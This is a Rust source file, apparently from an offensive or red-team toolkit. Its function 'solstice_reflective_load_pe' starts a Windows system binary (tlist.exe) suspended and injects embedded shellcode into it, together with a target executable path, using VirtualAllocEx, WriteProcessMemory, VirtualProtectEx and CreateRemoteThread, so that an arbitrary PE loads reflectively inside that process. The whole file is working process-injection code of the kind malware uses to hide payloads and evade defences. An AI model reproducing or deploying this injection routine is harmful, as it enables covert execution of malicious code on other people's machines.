use crate::assets::PE_LOADER_SC;
use crate::error::Error;
use log::info;
use std::mem::size_of;
use std::os::windows::io::AsRawHandle;
use std::os::windows::process::CommandExt;
use std::process::{Child, Command, Stdio};
use std::ptr::null_mut;
use std::str::FromStr;
use windows::Win32::Foundation::{GetLastError, HANDLE};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
    VirtualAllocEx, VirtualProtectEx,
};
use windows::Win32::System::Threading::{CREATE_SUSPENDED, CreateRemoteThread};

#[repr(C)]
struct ShellcodeArgs {
    image_name: *const u8,
    image_args: *const u8,
}

pub fn solstice_reflective_load_pe(
    path: &str,
    args: &[String],
    _working_dir: &str,
) -> Result<Child, Error> {
    info!(
        "[Solstice] Reflective loading PE: {path} with args {args:?} in {_working_dir}"
    );

    let mut path = String::from_str(path).unwrap();

    if !path.ends_with("\0") {
        path += "\0";
    }

    let shellcode_size = PE_LOADER_SC.len();
    info!("Shellcode size: {shellcode_size} bytes");

    // Spawn the target process in suspended state (we don't want it's main thread to run)
    let child = spawn_target_process()?;
    let process_handle = HANDLE(child.as_raw_handle() as isize);

    info!("Target process spawned with handle: {process_handle:?}");

    // Allocate memory for the shellcode in the remote process
    info!("Allocating memory for the shellcode in the remote process");
    let shellcode_addr = unsafe {
        VirtualAllocEx(
            process_handle,
            None,
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if shellcode_addr.is_null() {
        let error = unsafe { GetLastError() };
        return Err(Error::MemoryAllocation(format!(
            "Failed to allocate memory for shellcode: {error:?}"
        )));
    }

    info!("Shellcode allocated at: {shellcode_addr:?}");

    // Write shellcode to the remote process
    info!("Writing shellcode to remote process");
    let mut bytes_written = 0;
    let result = unsafe {
        WriteProcessMemory(
            process_handle,
            shellcode_addr,
            PE_LOADER_SC.as_ptr() as *const _,
            shellcode_size,
            Some(&mut bytes_written),
        )
    };

    if let Err(_err) = result {
        let error = unsafe { GetLastError() };
        return Err(Error::ProcessMemoryWrite(format!(
            "Failed to write shellcode: {error:?}"
        )));
    }

    info!("Shellcode written successfully, {bytes_written} bytes");

    // Change memory protection to executable
    info!("Changing memory protection to executable");
    let mut old_protection = PAGE_PROTECTION_FLAGS::default();
    let result = unsafe {
        VirtualProtectEx(
            process_handle,
            shellcode_addr,
            shellcode_size,
            PAGE_EXECUTE_READ,
            &mut old_protection,
        )
    };

    if let Err(_err) = result {
        let error = unsafe { GetLastError() };
        return Err(Error::MemoryAllocation(format!(
            "Failed to change memory protection: {error:?}"
        )));
    }

    info!("Memory protection changed successfully");

    // Allocate memory for the image name in the remote process
    let image_name_addr = unsafe {
        VirtualAllocEx(
            process_handle,
            None,
            path.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if image_name_addr.is_null() {
        let error = unsafe { GetLastError() };
        return Err(Error::MemoryAllocation(format!(
            "Failed to allocate memory for image name: {error:?}"
        )));
    }

    // Write the image name to the remote process
    let mut bytes_written = 0;
    let result = unsafe {
        WriteProcessMemory(
            process_handle,
            image_name_addr,
            path.as_ptr() as *const _,
            path.len(),
            Some(&mut bytes_written),
        )
    };

    if let Err(_err) = result {
        let error = unsafe { GetLastError() };
        return Err(Error::ProcessMemoryWrite(format!(
            "Failed to write image name: {error:?}"
        )));
    }

    // Create shellcode arguments structure
    let args = ShellcodeArgs {
        image_name: image_name_addr as *const u8,
        image_args: null_mut(),
    };

    // Allocate memory for the arguments in the remote process
    let args_addr = unsafe {
        VirtualAllocEx(
            process_handle,
            None,
            size_of::<ShellcodeArgs>(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if args_addr.is_null() {
        let error = unsafe { GetLastError() };
        return Err(Error::MemoryAllocation(format!(
            "Failed to allocate memory for arguments: {error:?}"
        )));
    }

    info!("Arguments will be allocated at: {args_addr:?}");

    // Write the arguments to the remote process
    let mut bytes_written = 0;
    let result = unsafe {
        WriteProcessMemory(
            process_handle,
            args_addr,
            &args as *const _ as *const _,
            size_of::<ShellcodeArgs>(),
            Some(&mut bytes_written),
        )
    };

    if let Err(_err) = result {
        let error = unsafe { GetLastError() };
        return Err(Error::ProcessMemoryWrite(format!(
            "Failed to write arguments: {error:?}"
        )));
    }

    // Create remote thread to execute the shellcode
    info!("Creating remote thread");
    let mut thread_id = 0u32;
    let thread_handle = unsafe {
        CreateRemoteThread(
            process_handle,
            None,
            0,
            Some(std::mem::transmute(shellcode_addr)),
            Some(args_addr as *mut _),
            0,
            Some(&mut thread_id),
        )
    };

    if let Err(_err) = thread_handle {
        let error = unsafe { GetLastError() };
        return Err(Error::ThreadCreation(format!(
            "Failed to create remote thread: {error:?}"
        )));
    }

    info!(
        "Remote thread created successfully, handle: {thread_handle:?}, thread ID: {thread_id}"
    );

    Ok(child)
}

fn spawn_target_process() -> Result<Child, Error> {
    let process_name = "C:\\Windows\\System32\\tlist.exe";

    let mut cmd = Command::new(process_name);
    let child = cmd
        .creation_flags(CREATE_SUSPENDED.0)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| Error::ProcessCreation(e.to_string()))?;

    Ok(child)
}
